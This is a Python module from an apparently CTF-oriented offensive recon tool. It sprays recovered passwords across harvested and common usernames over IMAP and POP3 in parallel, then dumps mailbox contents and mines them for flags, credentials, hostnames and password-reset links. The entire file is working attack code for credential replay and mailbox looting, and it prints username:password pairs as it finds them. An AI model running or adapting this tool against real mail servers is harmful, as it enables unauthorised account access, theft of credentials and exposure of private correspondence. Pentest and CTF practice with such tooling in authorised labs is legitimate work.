"""Credential-driven mailbox reading (POP3 / IMAP).

Recon recovers a password and a username scheme (an onboarding doc on an NFS
share, an email harvested off the site, an AD account); the mailbox is where the
next hop usually is — a reset link, a second credential, or the flag itself.
This pass takes every username candidate scryer has learned, tries each with the
recovered passwords over IMAP/POP3, and on a hit dumps recent message bodies and
scans them for flags, credentials, and links.

Pure standard library (imaplib / poplib). Runs only once scryer already holds a
credential, so it isn't a blind brute — it's replaying known passwords against
the accounts the box itself told us about.
"""

from __future__ import annotations

import concurrent.futures
import imaplib
import poplib
import re
from email import message_from_bytes
from email.header import decode_header
from typing import List, Set

from ...core import utils
from ...core.report import HostReport, Finding
from ...data import knowledge

_MAX_ATTEMPTS = 200
_MAX_MSGS = 25
_TIMEOUT = 6            # per mail connection — bounds the whole pass
_COMMON = ["admin", "administrator", "root", "info", "support", "test", "mail"]


def run(host: HostReport, opts) -> None:
    ports = {e["port"] for e in host.open_ports}
    imap_p = 993 if 993 in ports else (143 if 143 in ports else None)
    pop_p = 995 if 995 in ports else (110 if 110 in ports else None)
    if not (imap_p or pop_p):
        return
    users = _candidate_users(host)
    pws = list(dict.fromkeys(host.creds))
    if not users or not pws:
        return
    # Skip if we already probed this exact user/password set (the convergence
    # loop may call us again — don't re-run identical work).
    sig = (frozenset(u.lower() for u in users), frozenset(pws))
    if host.__dict__.get("_mail_sig") == sig:
        return
    host.__dict__["_mail_sig"] = sig

    ip = host.resolved_ip or host.target
    utils.section(f"MAIL {ip}")
    utils.log("info", f"replaying {len(pws)} password(s) across {len(users)} "
                      f"mailbox candidate(s)", indent=1)

    # Threaded, timeout-bounded login probe: one worker per user, each trying
    # the known passwords until one opens the mailbox. Timeouts are the whole
    # point — a serial, no-timeout probe of 40 users hung for ~27 minutes.
    # Prefer IMAP (folders); fall back to POP3 only when there's no IMAP port —
    # trying both per user just doubles connections against a rate-limiting
    # (Dovecot auth-delay) server.
    def probe(user):
        for pw in pws:
            body = (_imap(ip, imap_p, user, pw) if imap_p
                    else _pop(ip, pop_p, user, pw))
            if body is not None:
                return user, pw, body
        return None

    hits = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
        for result in pool.map(probe, users[:_MAX_ATTEMPTS]):
            if not result:
                continue
            user, pw, body = result
            hits += 1
            utils.log("hot", f"mailbox login: {user}:{pw}", indent=1)
            host.add_cred(pw)
            host.add(Finding(
                title=f"Mailbox access: {user}",
                detail=f"{user}:{pw} (IMAP/POP3). Read for a reset link, a second "
                       "credential, or the flag.", severity="high",
                category="cred", port=imap_p or pop_p, service="mail",
                evidence=f"{user}:{pw}"))
            _mine(host, user, body, imap_p or pop_p)
    if not hits:
        utils.log("dim", "no mailbox opened with the known credentials", indent=1)


# --------------------------------------------------------------------------
def _candidate_users(host: HostReport) -> List[str]:
    users: List[str] = []
    emails: Set[str] = host.__dict__.get("emails", set())
    for e in emails:
        users.append(e)                       # full address
        users.append(e.split("@", 1)[0])      # local part
    # usernames derived from names/conventions in looted onboarding docs
    users += sorted(host.__dict__.get("usernames", set()))
    users += list(host.__dict__.get("ad_users", []))
    # local-parts of any leaked emails in findings
    for f in host.findings:
        for m in re.findall(r"([A-Za-z0-9._%+-]+)@", f.title + " " + (f.detail or "")):
            users.append(m)
    users += _COMMON
    # dedupe, keep order, cap
    seen, out = set(), []
    for u in users:
        u = u.strip()
        if u and u.lower() not in seen:
            seen.add(u.lower())
            out.append(u)
    return out[:40]


def _imap(ip, port, user, pw):
    try:
        M = (imaplib.IMAP4_SSL(ip, port, timeout=_TIMEOUT) if port == 993
             else imaplib.IMAP4(ip, port, timeout=_TIMEOUT))
        if port == 143:
            try:
                M.starttls()
            except Exception:
                pass
        M.login(user, pw)
    except (imaplib.IMAP4.error, OSError):
        return None
    text = []
    try:
        folders = _folders(M)
        for folder in folders:
            try:
                typ, data = M.select(folder, readonly=True)
                if typ != "OK":
                    continue
                typ, sdata = M.search(None, "ALL")
                ids = (sdata[0].split() if sdata and sdata[0] else [])[-_MAX_MSGS:]
                for i in ids:
                    typ, msg = M.fetch(i, "(RFC822)")
                    if msg and msg[0]:
                        text.append(_msg_text(msg[0][1]))
            except (imaplib.IMAP4.error, OSError):
                continue
    except (imaplib.IMAP4.error, OSError):
        pass
    finally:
        try:
            M.logout()
        except Exception:
            pass
    return "\n".join(text)


def _folders(M):
    """All selectable folders (INBOX first) — the flag can hide in Sent/Archive."""
    names = ["INBOX"]
    try:
        typ, data = M.list()
        if typ == "OK":
            for row in data or []:
                s = row.decode("utf-8", "replace") if isinstance(row, bytes) else str(row)
                m = re.search(r'"([^"]+)"\s*$|(\S+)\s*$', s)
                name = (m.group(1) or m.group(2)) if m else None
                if name and name.upper() != "INBOX" and "\\Noselect" not in s:
                    names.append(name)
    except (imaplib.IMAP4.error, OSError):
        pass
    return names[:8]


def _pop(ip, port, user, pw):
    try:
        P = (poplib.POP3_SSL(ip, port, timeout=_TIMEOUT) if port == 995
             else poplib.POP3(ip, port, timeout=_TIMEOUT))
        if port == 110:
            try:
                P.stls()
            except Exception:
                pass
        P.user(user)
        P.pass_(pw)
    except (poplib.error_proto, OSError):
        return None
    text = []
    try:
        count = len(P.list()[1])
        for i in range(max(1, count - _MAX_MSGS + 1), count + 1):
            raw = b"\n".join(P.retr(i)[1])
            text.append(_msg_text(raw))
    except (poplib.error_proto, OSError):
        pass
    finally:
        try:
            P.quit()
        except Exception:
            pass
    return "\n".join(text)


def _msg_text(raw: bytes) -> str:
    try:
        msg = message_from_bytes(raw)
    except Exception:
        return raw.decode("latin-1", "replace")
    parts = [_dh(msg.get("subject", "")), _dh(msg.get("from", ""))]
    if msg.is_multipart():
        for p in msg.walk():
            if p.get_content_type() == "text/plain":
                try:
                    parts.append(p.get_payload(decode=True).decode(
                        "utf-8", "replace"))
                except Exception:
                    pass
    else:
        try:
            parts.append(msg.get_payload(decode=True).decode("utf-8", "replace"))
        except Exception:
            parts.append(str(msg.get_payload()))
    return "\n".join(p for p in parts if p)


def _dh(value: str) -> str:
    try:
        out = []
        for txt, enc in decode_header(value):
            out.append(txt.decode(enc or "utf-8", "replace")
                       if isinstance(txt, bytes) else txt)
        return "".join(out)
    except Exception:
        return value


def _mine(host: HostReport, user: str, body: str, port: int) -> None:
    for tok in knowledge.find_flags(body or "", allow_hex=True):
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c(f"║ FLAG (mail: {user})", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(
            title=f"FLAG in {user}'s mailbox", detail=tok, severity="critical",
            category="flag", port=port, service="mail", evidence=tok))
    for _lbl, val, _sev in knowledge.extract_secrets(body):
        host.add_cred(val)
        utils.log("hot", f"secret in mail: {val[:50]}", indent=2)
    for _u, pw in list(knowledge.find_conn_creds(body)):
        host.add_cred(pw)
    for _lbl, pw in knowledge.find_doc_creds(body):     # prose creds in mail
        host.add_cred(pw)
    # a new host named in the mail (next server / webmail) -> enumerate it
    from ..crack import _harvest_hostnames
    for hn in _harvest_hostnames(body):
        if host.add_hostname(hn):
            utils.log("hot", f"host from mail: "
                             f"{utils.c(hn, utils.C.CYAN, utils.C.BOLD)}", indent=2)
    # password-reset / onboarding links are the usual next hop
    for link in re.findall(r"https?://[^\s\"'<>]{8,120}", body or "")[:8]:
        if any(k in link.lower() for k in ("reset", "token", "verify", "invite",
                                           "onboard", "setup", "confirm")):
            utils.log("good", f"actionable link in mail: {link}", indent=2)
            host.add(Finding(
                title="Actionable link in mailbox",
                detail=f"{link} (from {user}'s mail — reset/onboarding token)",
                severity="high", category="web", port=port, service="mail",
                evidence=link))
